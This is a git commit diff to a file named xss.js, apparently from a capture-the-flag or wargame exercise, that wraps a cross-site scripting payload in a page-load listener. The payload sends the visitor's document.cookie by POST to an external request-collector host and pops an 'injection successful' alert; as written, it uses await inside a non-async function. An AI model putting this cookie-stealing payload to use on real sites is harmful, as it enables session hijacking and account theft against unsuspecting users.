edfc8070b09308359aa22e58b69e2d189f732b61
bluecard <64408866+bluecard873@users.noreply.github.com>
2023-02-10 16:33:31 +0900

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,8 @@
-a = await fetch("https://iwtekfx.request.dreamhack.games", {
+document.addEventListener("DOMContentLoaded", function(event) { 
+  a = await fetch("https://iwtekfx.request.dreamhack.games", {
     method: "POST",
     body: document.cookie
 })
 alert("code Injection Successful")
+});
+
